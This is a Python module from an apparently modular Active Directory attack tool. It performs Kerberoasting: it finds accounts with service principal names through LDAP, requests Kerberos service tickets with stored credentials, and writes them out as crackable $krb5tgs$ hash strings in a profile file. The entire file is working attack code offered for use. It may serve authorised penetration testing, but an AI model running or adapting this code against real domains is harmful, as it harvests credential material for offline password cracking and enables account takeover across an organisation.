from uuid import uuid4
from impacket.krb5 import constants
from impacket.krb5.types import Principal
from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
from impacket.ntlm import compute_lmhash, compute_nthash
from binascii import hexlify
from impacket.krb5.asn1 import TGS_REP
from pyasn1.codec.der import decoder
from rich.console import Console

from handlers.ldap_connection import LdapHandler
from handlers.profile.get_data import get_domain, get_username, get_password
from handlers.profile.helper import get_current_profile_path

console = Console()
random_uuid = uuid4().hex


class Kerberoasting:
    name = "kerberoasting"
    desc = "Search for kerberoasting computers and users"
    module_protocol = ["ldap"]
    opsec_safe = True
    multiple_hosts = False
    requires_args = True
    min_args = 1
    search_filter = "(&(objectClass=user)(servicePrincipalName=*)(!(cn=krbtgt))(!(samaccounttype=805306369)))" # (&(servicePrincipalName=*)(!(objectCategory=computer)))
    attributes = ["servicePrincipalName", "sAMAccountName"]
    usage_desc = "[yellow]Usage:[/] kerberoasting <dc_ip>"

    def __init__(self, context=None, module_options=None):
        self.context = context
        self.module_options = module_options

    def options(self):
        pass

    def get_kerberoastable_users(self, dc_ip) -> None:
        """Get all kerberoastable users through LDAP query"""
        conn, base_dn = LdapHandler.connection(self)
        results = conn.search(base_dn, self.search_filter, attributes=self.attributes)
        res_status = results[0]
        res_response = results[2]
        users_sam = []

        if res_status:
            for entry in res_response:
                if entry["type"] == "searchResEntry":
                    attributes = entry.get("attributes", {})
                    spns_sam = attributes.get("sAMAccountName", [])
                    users_sam.append(spns_sam)

        return users_sam

    def get_dc_dnshostname(self) -> None:
        """Get dnsHostname attribute from Domain Controller"""
        search_filter = "(&(objectCategory=Computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))"
        attributes = "dnsHostname"

        conn, base_dn = LdapHandler.connection(self)

        if conn is None:
            console.print("[red][!][/] Failed to establish LDAP connection.")
            return []

        results = conn.search(base_dn, search_filter, attributes=attributes)
        res_response = results[2]
        dcs_list = []

        for entry in res_response:
            if entry["type"] == "searchResEntry":
                hostname = entry["attributes"][attributes]
                dcs_list.append(hostname)

        return dcs_list

    def kerberoasting(self, username, password, domain):
        """Perform Kerberoasting attack"""
        user_name = Principal(
            username, type=constants.PrincipalNameType.NT_PRINCIPAL.value
        )
        lmhash = compute_lmhash(password)
        nthash = compute_nthash(password)
        kdc_server = self.get_dc_dnshostname()[0] if self.get_dc_dnshostname() else None

        if not kdc_server:
            console.print("[red][!][/] No Domain Controller found.")
            return None

        try:
            tgt, cipher, _oldSessionKey, sessionKey = getKerberosTGT(
                user_name, "", domain, lmhash, nthash, "", kdcHost=kdc_server
            )

            return tgt, cipher, sessionKey, kdc_server
        except Exception as e:
            console.print(f"[red][!][/] Exception during TGT request: {str(e)}")
            return None

    @staticmethod
    def format_kerberos_entry(etype, username, realm, spn, cipher_octets):
        """ Format how the TGs should be printed """
        spn = spn.replace(":", "~")

        if etype in [constants.EncryptionTypes.rc4_hmac.value, constants.EncryptionTypes.des_cbc_md5.value]:
            checksum = hexlify(cipher_octets[:16]).decode()
            data = hexlify(cipher_octets[16:]).decode()
            entry_format = f"$krb5tgs${etype}$*{username}${realm}${realm}/{spn}*${checksum}${data}"

        elif etype in [constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value, constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value]:
            checksum = hexlify(cipher_octets[-12:]).decode()
            data = hexlify(cipher_octets[:-12]).decode() 
            entry_format = f"$krb5tgs${etype}${username}${realm}$*{realm}/{spn}*${checksum}${data}"
        else:
            return "Unsupported encryption type"

        return entry_format

    def output_tgs(self, tgs, old_session_key, session_key, username, spn, fd=None):
        """Return TGS output"""
        decoded_tgs = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
        enc_part = decoded_tgs["ticket"]["enc-part"]
        etype = enc_part["etype"]
        cipher_octets = enc_part["cipher"].asOctets()
        entry = Kerberoasting.format_kerberos_entry(
            etype, username, decoded_tgs["ticket"]["realm"], spn, cipher_octets
        )

        return entry

    def save_tgs_output(self, tgs):
        """Save the TGS output on a text file in the profile folder"""
        path = get_current_profile_path() + "/" + f"{random_uuid}_kerberoasting.txt"

        try:
            with open(path, "+a") as kerberoasting_file:
                kerberoasting_file.write(f"{tgs}\n")

        except Exception as error:
            console.print(f"[red]![/] Error when writing TGS output to {path}: {error}")

    def on_login(self, con_input):
        """Main function"""
        console.print(f"- [cyan]Target[/]: {con_input}", highlight=False)
        kerberoastable_users = self.get_kerberoastable_users(con_input)

        if not kerberoastable_users:
            console.print("[red][!][/] No kerberoastable users found")
            return

        console.print(f"- [cyan]Kerberoastable Users[/]: {kerberoastable_users}", highlight=False)

        domain = get_domain()
        username = get_username()
        password = get_password()

        for user in kerberoastable_users:
            spn = user

            tgt, cipher, sessionKey, kdc_server = self.kerberoasting(
                username, password, domain
            )

            if not tgt:
                console.print(f"[red][!][/] Unable to obtain TGT for {spn}")
                return

            spn_principal = Principal(spn, type=constants.PrincipalNameType.NT_MS_PRINCIPAL.value)

            try:
                tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(
                    spn_principal, domain, kdc_server, tgt, cipher, sessionKey
                )

                tgs_output = self.output_tgs(tgs, oldSessionKey, sessionKey, user, spn)
                console.print(f"[yellow]{tgs_output}[/]\n", highlight=False)
                self.save_tgs_output(tgs_output)

            except Exception as error:
                console.print(f"[red][!][/] Exception during TGS request for {spn}: {error}")
                return

        console.print(f"- [cyan]Output saved in[/]: {get_current_profile_path()}/{random_uuid}_kerberoasting.txt", highlight=False)
